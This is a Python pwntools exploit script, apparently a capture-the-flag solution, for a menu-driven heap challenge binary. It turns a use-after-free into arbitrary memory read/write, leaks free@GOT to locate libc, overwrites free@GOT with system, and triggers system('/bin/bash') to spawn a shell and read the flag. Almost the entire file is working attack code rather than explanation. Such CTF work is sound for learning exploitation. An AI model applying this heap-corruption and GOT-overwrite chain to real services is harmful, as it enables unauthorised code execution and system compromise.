#!/usr/bin/env python3
# python3 port. Deleting an IntArray frees its chunks but leaves the ID usable
# (use-after-free). A same-size text string (strdup) reuses the freed IntArray
# chunk, letting us forge {intCount, ints}. Point a fake array's ints at the real
# array's ints field to get arbitrary R/W: leak free@GOT -> libc, overwrite
# free@GOT with system, then free("/bin/bash") == system("/bin/bash").
# Relies on glibc 2.23 (no tcache) fastbin reuse (UBUNTU_VERSION 16.04).
import sys, os
from pwn import ELF, remote, context, p32
import glob as _glob
def _find_libc(name):
    # The challenge libc ships only under the repo's publish/ tree (its *.so name
    # is gitignored in the challenge dir). Find it so ELF(name) works in `check`.
    if os.path.exists(name):
        return name
    d=os.path.dirname(os.path.abspath(__file__))
    for _ in range(6):
        cand=os.path.join(d,'publish')
        if os.path.isdir(cand):
            hits=_glob.glob(os.path.join(cand,'**',name),recursive=True)
            if hits:
                return hits[0]
        d=os.path.dirname(d)
    return name
HOST=os.environ.get('HOST', sys.argv[1] if len(sys.argv)>1 else '127.0.0.1')
PORT=int(os.environ.get('PORT', sys.argv[2] if len(sys.argv)>2 else 18005))
exe=ELF(".build/uaf" if os.path.exists(".build/uaf") else "uaf"); libc=ELF(_find_libc("uaf-libc.so")); context.binary=exe; context.log_level='error'
r=remote(HOST,PORT)
def menu(c): r.recvuntil(b"(>) "); r.sendline(str(c).encode())
def createText(t):
    menu(2); r.recvuntil(b"Enter a text string:\n"); r.sendline(t)
    r.recvuntil(b"ID of text string: "); return int(r.recvline().strip())
def createIntArray(ints):
    menu(1); r.recvuntil(b"How many integers?\n"); r.sendline(str(len(ints)).encode())
    r.recvuntil(b"integers:\n"); r.sendline(" ".join(map(str,ints)).encode())
    r.recvuntil(b"ID of integer array: "); return int(r.recvline().strip())
def objID(i): r.recvuntil(b"Enter object ID:\n"); r.sendline(str(i).encode())
def deleteIntArray(i): menu(6); objID(i)
def deleteText(i): menu(7); objID(i)
def getArray(i):
    menu(4); objID(i); r.recvuntil(b"Integer array:\n[")
    return [int(x) for x in r.recvuntil(b"]")[:-1].split(b", ")]
def editArray(i,index,val):
    menu(3); objID(i); r.recvuntil(b"Enter index to change:\n"); r.sendline(str(index).encode())
    sval = val-0x100000000 if val>=0x80000000 else val
    r.recvuntil(b"Enter new value:\n"); r.sendline(str(sval).encode())
def createFake(count,ptr):
    a=createIntArray([1,2,3,4]); deleteIntArray(a)
    t=createText(p32(count)+p32(ptr))
    return a
binsh=createText(b"/bin/bash")
arr1=createIntArray([0])
fake=createFake(0x41414141, arr1+4)
free_got=exe.got["free"]
editArray(fake,0,free_got)                 # arr1->ints = &free@GOT
free_addr=getArray(arr1)[0] & 0xffffffff   # *free@GOT
system_addr=free_addr + (libc.symbols["system"]-libc.symbols["free"])
editArray(arr1,0,system_addr)              # free@GOT = system
deleteText(binsh)                          # free("/bin/bash") -> system("/bin/bash")
r.sendline(b"cat flag.txt")
import re
data=r.recvall(timeout=4)
m=re.search(rb'sun\{[^}]*\}', data)
print(m.group(0).decode() if m else repr(data[-200:]))
